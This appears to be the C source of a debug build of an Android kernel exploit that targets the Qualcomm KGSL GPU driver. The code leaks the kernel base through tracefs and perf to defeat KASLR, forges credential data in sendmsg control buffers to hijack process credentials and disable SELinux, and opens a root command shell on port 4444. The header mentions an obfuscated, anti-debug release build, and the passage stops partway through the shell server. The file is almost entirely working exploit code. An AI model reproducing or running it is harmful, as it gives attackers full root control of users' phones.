// kugel_q2_debug.c -- DEBUG build of the Q2/Pro kugel exploit.
//
// Exploit logic BYTE-IDENTICAL to kugel_q2_embed.c. Only obfuscation surface
// differs:
//   * NO anti-debug (no PR_SET_DUMPABLE=0, no TracerPid check)
//   * NO string encryption (paths are plaintext literals)
//   * NO offset table encryption (targets_gen_plain.h is a plaintext struct)
//   * Verbose logging with full field names + errno at every step
//   * --dump: print target fields, then exit
//   * KUGEL_KASLR_SOURCE env var still selects tracefs/perf/verify (same as release)
//
// Durable logging:
//   - stdout       (may vanish when adbd is killed)
//   - log file     (/data/local/tmp/kugel.log by default, O_APPEND | O_SYNC)
//   - /dev/kmsg    (survives process death and soft panic; visible in dmesg/pstore)
//
// Requires targets_gen_plain.h (run: python embed_targets.py --plain).
// usage: kugel_q2_debug [--dump] [--preflight] [-b <build>] [-k <hex>]
//                       [-c "cmd"] [-n] [-l <path>]
//
// WARNING
//   On success this process must never exit. task->cred points into a socket
//   control buffer held alive only by a blocked sendmsg; killing the process
//   frees it and the exit path's put_cred writes into freed slab.

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/system_properties.h>
#include <linux/futex.h>
#include <linux/perf_event.h>
#include <time.h>

#include "targets_gen_plain.h"

#ifndef TARGETS_PLAINTEXT
#error "kugel_q2_debug.c requires targets_gen_plain.h."
#error "Generate it with: python embed_targets.py --plain"
#endif

#define IOC 0x09
struct drawctxt_create  { uint32_t flags, drawctxt_id; };
struct drawctxt_destroy { uint32_t drawctxt_id; };
struct galloc { uint64_t size, flags, va_len, mmapsize; uint32_t id, metadata_len; uint64_t metadata; };
struct gfree  { uint64_t flags, priv; uint32_t id, type, len, pad; };
struct ginfo  { uint64_t gpuaddr, flags, size, va_len, va_addr; uint32_t id; };
struct cmdobj { uint64_t offset, gpuaddr, size, flags; uint32_t id, pad; };
struct gcmd {
    uint64_t flags, cmdlist;
    uint32_t cmdsize, numcmds;
    uint64_t objlist;
    uint32_t objsize, numobjs;
    uint64_t synclist;
    uint32_t syncsize, numsyncs;
    uint32_t context_id, timestamp;
};

#define IOCTL_CTX_CREATE   _IOWR(IOC, 0x13, struct drawctxt_create)
#define IOCTL_CTX_DESTROY  _IOW (IOC, 0x14, struct drawctxt_destroy)
#define IOCTL_GPUOBJ_ALLOC _IOWR(IOC, 0x45, struct galloc)
#define IOCTL_GPUOBJ_FREE  _IOW (IOC, 0x46, struct gfree)
#define IOCTL_GPUOBJ_INFO  _IOWR(IOC, 0x47, struct ginfo)
#define IOCTL_GPU_COMMAND  _IOWR(IOC, 0x4a, struct gcmd)

#define MEMFLAGS_KMALLOC (3ULL << 26)
#define GPUREADONLY      0x01000000ULL
#define CTX_FLAGS        0x16u
#define NSEND            16
#define ROOT_SHELL_PORT  4444

/* ---- runtime state ---- */
static int      kgsl = -1;
static uint32_t ctx_id;
static uint64_t kbase;
static int      logfd = -1;
static int      kmsgfd = -1;
static int      do_flip = 1;
static int      preflight = 0;
static int      dump_mode = 0;
static const char *run_cmd = NULL;
static int      skip_adbd = 0;

static uint64_t OFF_COMMIT_CREDS;
static uint64_t OFF_ROOT_USER;
static uint64_t OFF_INIT_USER_NS;
static uint64_t OFF_INIT_GROUPS;
static uint64_t OFF_SELINUX_STATE;
static uint64_t OFF_SECBLOB;
static uint64_t OFF_RET;
static uint64_t OFF_TRACE_WCHAN;
static uint64_t CAP_FULL;
static uint64_t TEXT_LINK;

static volatile int go_spray, go_destroy, nready;
static int send_sv[NSEND][2];
static int main_sv[2];

static void logmsg(const char *fmt, ...)
{
    char b[512];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(b, sizeof(b), fmt, ap);
    va_end(ap);
    if (n <= 0) return;

    write(1, b, (size_t)n);
    if (logfd >= 0) write(logfd, b, (size_t)n);
    if (kmsgfd >= 0) {
        char kb[600];
        int kn = snprintf(kb, sizeof(kb), "<6>kugel[%d]: %.*s", getpid(), n, b);
        if (kn > 0) write(kmsgfd, kb, (size_t)kn);
    }
}
#define LOG(...) logmsg(__VA_ARGS__)

#define STAGE(name) LOG("\n=== STAGE: %s (pid=%d uid=%d) ===\n", \
                        name, getpid(), getuid())

static void ensure_kmsg(void)
{
    if (kmsgfd >= 0) return;
    kmsgfd = open("/dev/kmsg", O_WRONLY);
    if (kmsgfd < 0) {
        LOG("[!] /dev/kmsg not writable (errno=%d %s); kmsg sink disabled\n",
            errno, strerror(errno));
    } else {
        LOG("[*] /dev/kmsg opened (fd=%d)\n", kmsgfd);
    }
}

static void pin_cpu(void)
{
    cpu_set_t s;
    CPU_ZERO(&s); CPU_SET(0, &s);
    if (sched_setaffinity(0, sizeof(s), &s) != 0) {
        CPU_ZERO(&s); CPU_SET(1, &s);
        sched_setaffinity(0, sizeof(s), &s);
    }
}

/* Unpin from CPU 0 so the shell/payloads are not restricted to a single core. */
static void unpin_cpu(void)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu <= 0) ncpu = 1;
    for (int i = 0; i < ncpu && i < 32; i++) CPU_SET(i, &set);
    sched_setaffinity(0, sizeof(set), &set);
}

static uint64_t xt_hash(const char *s)
{
    uint64_t h = 0xcbf29ce484222325ULL;
    for (; *s; s++) { h ^= (uint8_t)*s; h *= 0x100000001b3ULL; }
    return h;
}

static int load_target_by_build(const char *build)
{
    uint64_t h = xt_hash(build);
    LOG("[*] build_incremental: %s\n", build);
    LOG("[*] fnv1a64(build):    0x%016llx\n", (unsigned long long)h);
    LOG("[*] target count:      %d\n", XT_COUNT);

    for (int i = 0; i < XT_COUNT; i++) {
        if (KUGEL_TARGETS[i].build_hash != h) continue;

        OFF_COMMIT_CREDS  = KUGEL_TARGETS[i].commit_creds;
        OFF_ROOT_USER     = KUGEL_TARGETS[i].root_user;
        OFF_INIT_USER_NS  = KUGEL_TARGETS[i].init_user_ns;
        OFF_INIT_GROUPS   = KUGEL_TARGETS[i].init_groups;
        OFF_SELINUX_STATE = KUGEL_TARGETS[i].selinux_state;
        OFF_SECBLOB       = KUGEL_TARGETS[i].secblob;
        OFF_RET           = KUGEL_TARGETS[i].ret_gadget;
        OFF_TRACE_WCHAN   = KUGEL_TARGETS[i].trace_wchan;
        CAP_FULL          = KUGEL_TARGETS[i].cap_full;
        TEXT_LINK         = KUGEL_TARGETS[i].text_base;

        LOG("[*] matched table entry index %d\n", i);
        LOG("    OFF_COMMIT_CREDS  = 0x%llx\n", (unsigned long long)OFF_COMMIT_CREDS);
        LOG("    OFF_ROOT_USER     = 0x%llx\n", (unsigned long long)OFF_ROOT_USER);
        LOG("    OFF_INIT_USER_NS  = 0x%llx\n", (unsigned long long)OFF_INIT_USER_NS);
        LOG("    OFF_INIT_GROUPS   = 0x%llx\n", (unsigned long long)OFF_INIT_GROUPS);
        LOG("    OFF_SELINUX_STATE = 0x%llx\n", (unsigned long long)OFF_SELINUX_STATE);
        LOG("    OFF_SECBLOB       = 0x%llx\n", (unsigned long long)OFF_SECBLOB);
        LOG("    OFF_RET           = 0x%llx\n", (unsigned long long)OFF_RET);
        LOG("    OFF_TRACE_WCHAN   = 0x%llx\n", (unsigned long long)OFF_TRACE_WCHAN);
        LOG("    CTX_REFS_OFF      = 0x%llx\n", (unsigned long long)KUGEL_TARGETS[i].ctx_refs_off);
        LOG("    CAP_FULL          = 0x%llx\n", (unsigned long long)CAP_FULL);
        LOG("    TEXT_LINK         = 0x%llx\n", (unsigned long long)TEXT_LINK);

        if (!OFF_COMMIT_CREDS || !OFF_SELINUX_STATE || !OFF_RET || !CAP_FULL) {
            LOG("[-] table entry has zero mandatory offset\n");
            return -1;
        }
        if (OFF_TRACE_WCHAN >= 0x200000ULL) {
            LOG("[!] OFF_TRACE_WCHAN=0x%llx >= 0x200000 (outside scheduler "
                "range); disabling tracefs for this build\n",
                (unsigned long long)OFF_TRACE_WCHAN);
            OFF_TRACE_WCHAN = 0;
        }
        LOG("[*] effective OFF_TRACE_WCHAN=0x%llx\n",
            (unsigned long long)OFF_TRACE_WCHAN);
        return 0;
    }
    LOG("[-] no table entry for this build\n");
    return -1;
}

static uint64_t gpuaddr_of(uint32_t id)
{
    struct ginfo g;
    memset(&g, 0, sizeof(g));
    g.id = id;
    if (ioctl(kgsl, IOCTL_GPUOBJ_INFO, &g)) return 0;
    return g.gpuaddr;
}

static void fill_sock(int fd)
{
    int sz = 4096;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    char buf[4096];
    memset(buf, 'A', sizeof(buf));
    long total = 0;
    for (;;) {
        ssize_t n = send(fd, buf, sizeof(buf), MSG_NOSIGNAL);
        if (n <= 0) break;
        total += n;
    }
    fcntl(fd, F_SETFL, fl & ~O_NONBLOCK);
    LOG("   socket filled %ld bytes (errno=%d)\n", total, errno);
}

static ssize_t send_fake(int fd)
{
    unsigned char cbuf[192];
    memset(cbuf, 0, sizeof(cbuf));

    uint64_t selinux_word = kbase + OFF_SELINUX_STATE;
    if (do_flip) {
        *(uint64_t *)(cbuf + 0x08) = selinux_word - 0x148;
        *(uint32_t *)(cbuf + 0x20) = 1;
        *(uint64_t *)(cbuf + 0x30) = kbase + OFF_RET;
    } else {
        *(uint64_t *)(cbuf + 0x08) = 0;
        *(uint32_t *)(cbuf + 0x20) = 2;
        *(uint64_t *)(cbuf + 0x30) = CAP_FULL;
    }
    *(uint64_t *)(cbuf + 0x28) = kbase + OFF_COMMIT_CREDS;

    *(uint64_t *)(cbuf + 0x00) = 192;
    *(uint64_t *)(cbuf + 0x38) = CAP_FULL;
    *(uint64_t *)(cbuf + 0x40) = CAP_FULL;
    *(uint64_t *)(cbuf + 0x48) = 0;
    *(uint64_t *)(cbuf + 0x78) = kbase + OFF_SECBLOB;
    *(uint64_t *)(cbuf + 0x80) = kbase + OFF_ROOT_USER;
    *(uint64_t *)(cbuf + 0x88) = kbase + OFF_INIT_USER_NS;
    *(uint64_t *)(cbuf + 0x90) = kbase + OFF_INIT_GROUPS;

    char d = 0;
    struct iovec iov = { &d, 1 };
    struct msghdr m;
    memset(&m, 0, sizeof(m));
    m.msg_iov = &iov; m.msg_iovlen = 1;
    m.msg_control = cbuf; m.msg_controllen = sizeof(cbuf);
    return sendmsg(fd, &m, 0);
}

static void *sender_thread(void *arg)
{
    int i = (int)(intptr_t)arg;
    pin_cpu();
    __sync_fetch_and_add(&nready, 1);
    while (!go_spray) usleep(50);
    ssize_t r = send_fake(send_sv[i][0]);
    LOG("[s%d] sendmsg r=%zd errno=%d\n", i, r, errno);
    return NULL;
}

/* ---- KASLR leak: perf (fallback) ------------------------------------ */
static uint64_t kaslr_leak_perf(void)
{
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_SOFTWARE;
    pe.config = PERF_COUNT_SW_TASK_CLOCK;
    pe.size = sizeof(pe);
    pe.sample_type = PERF_SAMPLE_CALLCHAIN;
    pe.sample_period = 1000000;
    pe.disabled = 1;

    errno = 0;
    int pfd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (pfd < 0) { LOG("[-] perf_event_open errno=%d (%s)\n", errno, strerror(errno)); return 0; }

    size_t bufsz = (1 + 64) * 4096;
    void *ring = mmap(NULL, bufsz, PROT_READ | PROT_WRITE, MAP_SHARED, pfd, 0);
    if (ring == MAP_FAILED) { LOG("[-] mmap errno=%d\n", errno); close(pfd); return 0; }

    ioctl(pfd, PERF_EVENT_IOC_RESET, 0);
    ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
    { char z = 0; int dn = open("/dev/null", O_WRONLY);
      for (int i = 0; i < 400000; i++) write(dn, &z, 1);
      close(dn); }
    ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *mp = ring;
    uint8_t *data = (uint8_t *)ring + 4096;
    uint64_t head = mp->data_head;
    __sync_synchronize();

    uint64_t buckets[128] = {0}; int counts[128] = {0};
    int nb = 0, ns = 0;
    static uint64_t samples[20000];
    uint64_t pos = 0;
    while (pos < head && pos < bufsz - 4096) {
        struct perf_event_header *h = (struct perf_event_header *)(data + (pos % (64 * 4096)));
        if (!h->size) break;
        if (h->type == PERF_RECORD_SAMPLE) {
            uint64_t *p = (uint64_t *)(h + 1);
            uint64_t nr = *p++;
            for (uint64_t i = 0; i < nr && i < 32; i++) {
                uint64_t a = p[i];
                if (a < 0xffffff8000000000ULL || a >= 0xffffffc000000000ULL) continue;
                if (ns < 20000) samples[ns++] = a;
                uint64_t b = a & ~0x1fffffULL;
                int f = 0;
                for (int j = 0; j < nb; j++) if (buckets[j] == b) { counts[j]++; f = 1; break; }
                if (!f && nb < 128) { buckets[nb] = b; counts[nb++] = 1; }
            }
        }
        pos += h->size;
    }
    munmap(ring, bufsz); close(pfd);
    if (!nb) return 0;

    uint64_t best = 0; int bestc = 0;
    for (int i = 0; i < nb; i++) if (counts[i] > bestc) { bestc = counts[i]; best = buckets[i]; }
    uint64_t lo = best > 0x1000000ULL ? best - 0x1000000ULL : 0;
    uint64_t hi = best + 0x1000000ULL, minc = ~0ULL;
    for (int i = 0; i < ns; i++)
        if (samples[i] >= lo && samples[i] < hi && samples[i] < minc) minc = samples[i];
    if (minc == ~0ULL) return 0;

    uint64_t cand = (minc & ~0x1fffffULL) + 0x80000ULL;
    uint64_t hits = 0;
    for (int i = 0; i < ns; i++)
        if (samples[i] >= cand && samples[i] - cand < 0x1000000ULL) hits++;
    LOG("[*] perf: samples=%d cand=0x%llx hits=%llu\n",
        ns, (unsigned long long)cand, (unsigned long long)hits);
    if (hits >= 100 && hits * 2 >= (uint64_t)ns) return cand;
    LOG("[!] perf leak weak\n");
    return 0;
}

/* ---- KASLR leak: tracefs (primary) ---------------------------------- */
#define TRACEFS          "/sys/kernel/tracing"
#define TRACE_FORMAT     TRACEFS "/events/sched/sched_blocked_reason/format"
#define TRACE_ENABLE     TRACEFS "/events/sched/sched_blocked_reason/enable"
#define TRACE_ON         TRACEFS "/tracing_on"
#define TRACE_CLEAR      TRACEFS "/trace"
#define TRACE_PERCPU_RAW TRACEFS "/per_cpu/cpu%d/trace_pipe_raw"

#define TR_MAX_WORKERS     32
#define TR_WORKERS_DEFAULT 32
#define TR_HOLD_MS_DEFAULT 1000
#define TR_TIMEOUT_MS      50
#define TR_MAX_SAMPLES     65536
#define TR_MAX_TIDS        64

static int tr_event_id    = -1;
static int tr_caller_off  = -1;
static int tr_io_wait_off = -1;
static int tr_pid_off     = -1;

static volatile int tr_stop;
static volatile int tr_start;
static volatile int tr_ready;

static int tr_worker_tids[TR_MAX_TIDS];
static int tr_our_tids[TR_MAX_TIDS];
static int tr_our_tid_count;

static int tr_use_pid_filter = 0;
static int tr_use_io_filter  = 0;

static int tr_futex_words[TR_MAX_WORKERS];

static unsigned long tr_dbg_raw;
static unsigned long tr_dbg_pid_pass;
static unsigned long tr_dbg_io_pass;
static unsigned long tr_dbg_align_pass;
static unsigned long tr_dbg_align_drop;
static unsigned long tr_dbg_io_one;
static uint32_t tr_dbg_first_pids[16];
static unsigned long tr_dbg_first_pid_count;

static char *tr_read_file(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) return NULL;
    size_t cap = 8192;
    char *b = malloc(cap);
    if (!b) { close(fd); return NULL; }
    size_t used = 0;
    while (used + 1 < cap) {
        ssize_t n = read(fd, b + used, cap - used - 1);
        if (n < 0) { free(b); close(fd); return NULL; }
        if (n == 0) break;
        used += (size_t)n;
        if (used > 1024 * 1024) break;
    }
    close(fd);
    b[used] = 0;
    return b;
}

static int tr_write_file(const char *path, const char *val)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, val, strlen(val));
    close(fd);
    return (n == (ssize_t)strlen(val)) ? 0 : -1;
}

static int tr_parse_format(void)
{
    char *f = tr_read_file(TRACE_FORMAT);
    if (!f) return -1;

    char *p = strstr(f, "ID:");
    if (p) tr_event_id = atoi(p + 3);

    p = strstr(f, "caller");
    if (p) {
        char *q = strstr(p, "offset:");
        if (q) tr_caller_off = atoi(q + 7);
    }

    p = strstr(f, "pid_t pid");
    if (!p) p = strstr(f, " pid;");
    if (p) {
        char *q = strstr(p, "offset:");
        if (q) tr_pid_off = atoi(q + 7);
    }

    p = strstr(f, "io_wait");
    if (p) {
        char *q = strstr(p, "offset:");
        if (q) tr_io_wait_off = atoi(q + 7);
    }

    free(f);
    if (tr_event_id < 0 || tr_caller_off < 0) return -1;
    return 0;
}

static int tr_tid_mine(uint32_t pid)
{
    if (tr_our_tid_count == 0) return 1;
    for (int i = 0; i < tr_our_tid_count; i++)
        if ((uint32_t)tr_our_tids[i] == pid) return 1;
    return 0;
}

static void tr_collect_tids(int nworkers)
{
    tr_our_tid_count = 0;
    for (int i = 0; i < nworkers && tr_our_tid_count < TR_MAX_TIDS; i++) {
        if (tr_worker_tids[i] > 0)
            tr_our_tids[tr_our_tid_count++] = tr_worker_tids[i];
    }
    if (tr_our_tid_count < TR_MAX_TIDS) {
        int self = (int)syscall(SYS_gettid);
        int dup = 0;
        for (int i = 0; i < tr_our_tid_count; i++)
            if (tr_our_tids[i] == self) { dup = 1; break; }
        if (!dup) tr_our_tids[tr_our_tid_count++] = self;
    }
}

static void *tr_worker_fn(void *arg)
{
    int idx = (int)(intptr_t)arg;
    if (idx >= 0 && idx < TR_MAX_TIDS)
        tr_worker_tids[idx] = (int)syscall(SYS_gettid);
    __sync_fetch_and_add(&tr_ready, 1);

    while (!tr_start) usleep(50);

    int *fw = &tr_futex_words[idx & (TR_MAX_WORKERS - 1)];
    while (!tr_stop) {
        struct timespec ts;
        ts.tv_sec  = TR_TIMEOUT_MS / 1000;
        ts.tv_nsec = (TR_TIMEOUT_MS % 1000) * 1000000L;
        syscall(SYS_futex, fw, FUTEX_WAIT_PRIVATE, 0, &ts, NULL, 0);
    }
    return NULL;
}

static void tr_parse_page(const uint8_t *pg, size_t len,
                          uint64_t *v, int *n, int max)
{
    if (len < 16) return;
    size_t p = 16;
    while (p + 4 <= len) {
        uint32_t hdr;
        memcpy(&hdr, pg + p, 4);
        unsigned tlen = hdr & 0x1f;
        size_t evlen;
        if      (tlen == 0)              break;
        else if (tlen == 1 || tlen == 2) evlen = 4;
        else if (tlen <= 28)             evlen = 4 + tlen * 4;
        else if (tlen == 29)             evlen = 4 + 4;
        else if (tlen == 30)             evlen = 4 + 8;
        else                             evlen = 4 + 12;
        if (p + evlen > len) break;

        if (tlen >= 3 && tlen <= 28) {
            const uint8_t *pl = pg + p + 4;
            size_t plen = tlen * 4;
            if (plen >= 2) {
                uint16_t et;
                memcpy(&et, pl, 2);
                if (et == tr_event_id && (size_t)tr_caller_off + 8 <= plen) {
                    uint32_t event_pid = 0;
                    uint8_t  event_io  = 0;
                    uint64_t caller    = 0;
                    if (tr_pid_off >= 0 && (size_t)tr_pid_off + 4 <= plen)
                        memcpy(&event_pid, pl + tr_pid_off, 4);
                    if (tr_io_wait_off >= 0 && (size_t)tr_io_wait_off < plen)
                        event_io = pl[tr_io_wait_off];
                    memcpy(&caller, pl + tr_caller_off, 8);

                    tr_dbg_raw++;
                    if (tr_dbg_first_pid_count < 16)
                        tr_dbg_first_pids[tr_dbg_first_pid_count++] = event_pid;
                    if (event_io == 1) tr_dbg_io_one++;

                    int keep = 1;
                    if (tr_use_pid_filter && tr_our_tid_count > 0 &&
                        tr_pid_off >= 0 && !tr_tid_mine(event_pid))
                        keep = 0;
                    if (keep) tr_dbg_pid_pass++;
                    if (keep && tr_use_io_filter && tr_io_wait_off >= 0 &&
                        event_io != 0)
                        keep = 0;

                    if (keep && caller && OFF_TRACE_WCHAN) {
                        if (caller < TEXT_LINK + OFF_TRACE_WCHAN) {
                            tr_dbg_align_drop++;
                            keep = 0;
                        } else {
                            uint64_t delta = caller - TEXT_LINK - OFF_TRACE_WCHAN;
                            if (delta & 0x1fffffULL) {
                                tr_dbg_align_drop++;
                                keep = 0;
                            }
                        }
                    }

                    if (keep) {
                        tr_dbg_io_pass++;
                        if (caller) {
                            tr_dbg_align_pass++;
                            if (*n < max) v[(*n)++] = caller;
                        }
                    }
                }
            }
        }
        p += evlen;
    }
}

static void tr_capture_cpu(int cpu, uint64_t *v, int *n, int max)
{
    char path[256];
    snprintf(path, sizeof(path), TRACE_PERCPU_RAW, cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0) return;
    size_t bs = 4096 * 4;
    uint8_t *buf = malloc(bs);
    if (!buf) { close(fd); return; }
    ssize_t r;
    while ((r = read(fd, buf, bs)) > 0) {
        for (ssize_t o = 0; o < r; o += 4096) {
            size_t c = (size_t)r - (size_t)o;
            if (c > 4096) c = 4096;
            tr_parse_page(buf + o, c, v, n, max);
        }
    }
    free(buf);
    close(fd);
}

static int tr_cmp_u64(const void *a, const void *b)
{
    uint64_t x = *(const uint64_t *)a, y = *(const uint64_t *)b;
    return (x > y) - (x < y);
}

static int tr_env_int(const char *name, int fallback)
{
    const char *v = getenv(name);
    if (!v || !*v) return fallback;
    char *end = NULL;
    errno = 0;
    long parsed = strtol(v, &end, 0);
    if (errno != 0 || !end || *end != 0 || parsed <= 0 || parsed > 1 << 20)
        return fallback;
    return (int)parsed;
}

static uint64_t kaslr_leak_tracefs(void)
{
    if (access(TRACE_FORMAT, R_OK) != 0) {
        LOG("[-] tracefs not accessible errno=%d (%s)\n", errno, strerror(errno));
        return 0;
    }
    if (tr_parse_format() < 0) {
        LOG("[-] tracefs format parse failed\n");
        return 0;
    }
    LOG("[*] tracefs id=%d caller_off=%d pid_off=%d io_wait_off=%d\n",
        tr_event_id, tr_caller_off, tr_pid_off, tr_io_wait_off);

    const char *pf = getenv("KUGEL_TR_PIDFILTER");
    tr_use_pid_filter = (pf && strcmp(pf, "1") == 0);
    const char *iof = getenv("KUGEL_TR_IOFILTER");
    tr_use_io_filter  = (iof && strcmp(iof, "1") == 0);
    LOG("[*] tracefs filters pid=%d io=%d twc=0x%llx\n",
        tr_use_pid_filter, tr_use_io_filter,
        (unsigned long long)OFF_TRACE_WCHAN);

    tr_dbg_raw = tr_dbg_pid_pass = tr_dbg_io_pass = 0;
    tr_dbg_align_pass = tr_dbg_align_drop = tr_dbg_io_one = 0;
    tr_dbg_first_pid_count = 0;

    int workers = tr_env_int("KUGEL_TR_WORKERS", TR_WORKERS_DEFAULT);
    int hold_ms = tr_env_int("KUGEL_TR_HOLD_MS", TR_HOLD_MS_DEFAULT);
    if (workers < 2) workers = 2;
    if (workers > TR_MAX_WORKERS) workers = TR_MAX_WORKERS;

    tr_ready = 0;
    tr_start = 0;
    tr_stop  = 0;
    memset(tr_worker_tids, 0, sizeof(tr_worker_tids));
    memset(tr_futex_words, 0, sizeof(tr_futex_words));
    tr_our_tid_count = 0;

    pthread_t th[TR_MAX_WORKERS];
    for (int i = 0; i < workers; i++)
        pthread_create(&th[i], NULL, tr_worker_fn, (void *)(intptr_t)i);

    while (tr_ready < workers) usleep(100);
    tr_collect_tids(workers);
    LOG("[*] tracefs filtering to %d TIDs (workers=%d hold_ms=%d)\n",
        tr_our_tid_count, workers, hold_ms);

    tr_write_file(TRACE_ON, "0");
    tr_write_file(TRACE_CLEAR, "0");
    tr_write_file(TRACE_ENABLE, "0");
    if (tr_write_file(TRACE_ENABLE, "1") < 0) {
        LOG("[-] tracefs enable failed errno=%d\n", errno);
        tr_stop = 1;
        for (int i = 0; i < workers; i++) pthread_join(th[i], NULL);
        return 0;
    }
    if (tr_write_file(TRACE_ON, "1") < 0) {
        LOG("[-] tracing_on failed errno=%d\n", errno);
        tr_write_file(TRACE_ENABLE, "0");
        tr_stop = 1;
        for (int i = 0; i < workers; i++) pthread_join(th[i], NULL);
        return 0;
    }

    tr_start = 1;
    usleep((useconds_t)hold_ms * 1000);

    tr_write_file(TRACE_ON, "0");
    tr_stop = 1;
    for (int i = 0; i < workers; i++) pthread_join(th[i], NULL);
    tr_write_file(TRACE_ENABLE, "0");

    static uint64_t samples[TR_MAX_SAMPLES];
    int ns = 0;
    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    if (ncpu <= 0) ncpu = 1;
    if (ncpu > 64) ncpu = 64;
    for (int c = 0; c < (int)ncpu; c++)
        tr_capture_cpu(c, samples, &ns, TR_MAX_SAMPLES);

    LOG("[*] tracefs raw=%lu pid_pass=%lu io_pass=%lu align_pass=%lu "
        "align_drop=%lu io_one=%lu\n",
        tr_dbg_raw, tr_dbg_pid_pass, tr_dbg_io_pass,
        tr_dbg_align_pass, tr_dbg_align_drop, tr_dbg_io_one);

    if (tr_dbg_first_pid_count > 0) {
        char pidbuf[160];
        int off = 0;
        for (unsigned long i = 0; i < tr_dbg_first_pid_count && off < 150; i++)
            off += snprintf(pidbuf + off, sizeof(pidbuf) - off, "%s%u",
                            i ? "," : "", tr_dbg_first_pids[i]);
        LOG("[*] tracefs first pids: %s\n", pidbuf);
    }

    if (ns < 8) {
        LOG("[-] tracefs only %d samples after filters\n", ns);
        if (tr_dbg_raw == 0) {
            LOG("[-] diagnose: 0 raw events; tracepoint not firing. "
                "Check %s stays 1 during hold, and that OFF_TRACE_WCHAN "
                "is nonzero (currently 0x%llx).\n",
                TRACE_ON, (unsigned long long)OFF_TRACE_WCHAN);
        } else if (OFF_TRACE_WCHAN == 0) {
            LOG("[-] diagnose: %lu raw events, but OFF_TRACE_WCHAN=0 so "
                "the alignment gate is off and only 2MB rounding is "
                "possible. Set OFF_TRACE_WCHAN in targets_gen.h.\n",
                tr_dbg_raw);
        } else {
            LOG("[-] diagnose: %lu raw events, %lu dropped by alignment "
                "gate. Candidates in trace_wchan_candidates may include "
                "the real site; try KUGEL_KASLR_SOURCE=verify after "
                "setting it, or use --trace-wchan-manual.\n",
                tr_dbg_raw, tr_dbg_align_drop);
        }
        return 0;
    }
    LOG("[*] tracefs samples=%d\n", ns);

    qsort(samples, (size_t)ns, sizeof(uint64_t), tr_cmp_u64);
    uint64_t best = 0;
    int bestc = 0;
    for (int i = 0; i < ns; ) {
        int j = i;
        while (j < ns && samples[j] == samples[i]) j++;
        if (j - i > bestc) { bestc = j - i; best = samples[i]; }
        i = j;
    }
    LOG("[*] tracefs mode=%016llx votes=%d/%d\n",
        (unsigned long long)best, bestc, ns);

    if (bestc < 8) {
        LOG("[-] tracefs mode too weak (%d/%d < 8 votes)\n", bestc, ns);
        return 0;
    }

    uint64_t cand;
    if (OFF_TRACE_WCHAN) {
        cand = best - OFF_TRACE_WCHAN;
        LOG("[*] tracefs via OFF_TRACE_WCHAN=0x%llx\n",
            (unsigned long long)OFF_TRACE_WCHAN);
    } else {
        const uint64_t GRAN = 0x200000ULL;
        uint64_t residue = TEXT_LINK & (GRAN - 1);
        cand = ((best - residue) & ~(GRAN - 1)) + residue;
        LOG("[*] tracefs via 2MB rounding\n");
    }

    if (cand == 0 || (cand & 0x1fffffULL) != (TEXT_LINK & 0x1fffffULL)) {
        LOG("[-] tracefs base %016llx not granule-aligned with link %016llx\n",
            (unsigned long long)cand, (unsigned long long)TEXT_LINK);
        return 0;
    }
    uint64_t slide = (cand > TEXT_LINK) ? (cand - TEXT_LINK) : 0;
    LOG("[+] tracefs-leak-ok base=%016llx slide=%016llx samples=%d\n",
        (unsigned long long)cand, (unsigned long long)slide, ns);
    return cand;
}

/* ---- top-level KASLR dispatch --------------------------------------- */
static uint64_t kaslr_leak_auto(void)
{
    const char *src = getenv("KUGEL_KASLR_SOURCE");
    if (src && strcmp(src, "perf") == 0)
        return kaslr_leak_perf();
    if (src && strcmp(src, "tracefs") == 0)
        return kaslr_leak_tracefs();
    if (src && strcmp(src, "verify") == 0) {
        uint64_t a = kaslr_leak_tracefs();
        uint64_t b = kaslr_leak_perf();
        if (a && b) {
            LOG("[*] verify tf=%016llx perf=%016llx match=%d\n",
                (unsigned long long)a, (unsigned long long)b, a == b);
            return (a == b) ? a : 0;
        }
        LOG("[*] verify one side missing tf=%016llx perf=%016llx\n",
            (unsigned long long)a, (unsigned long long)b);
        return a ? a : b;
    }
    uint64_t k = kaslr_leak_tracefs();
    if (k) return k;
    LOG("[!] tracefs failed, falling back to perf\n");
    return kaslr_leak_perf();
}

/* ---- 4444 root shell server -----------------------------------------
 *
 * Runs as uid=0/CAP_FULL/su:s0 (inherited from kugel).
 * Per connection, forks a child that:
 *   - unpins from CPU 0 (so payloads can use all cores)
 *   - writes "u:r:shell:s0" to /proc/self/attr/exec
 *   - reads command lines and runs each with popen(), flushing output
 *     back immediately so the client never blocks on buffering.
 * ────────────────────────────────────────────────────────────────────── */
static void *root_shell_server(void *arg)
{
    (void)arg;
    int srv = socket(AF_INET, SOCK_STREAM, 0);
    if (srv < 0) { LOG("[sh] socket: %s\n", strerror(errno)); return NULL; }
    int one = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(ROOT_SHELL_PORT);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    if (bind(srv, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        LOG("[sh] bind :%d errno=%d (%s)\n", ROOT_SHELL_PORT, errno, strerror(errno));
        close(srv); return NULL;
    }
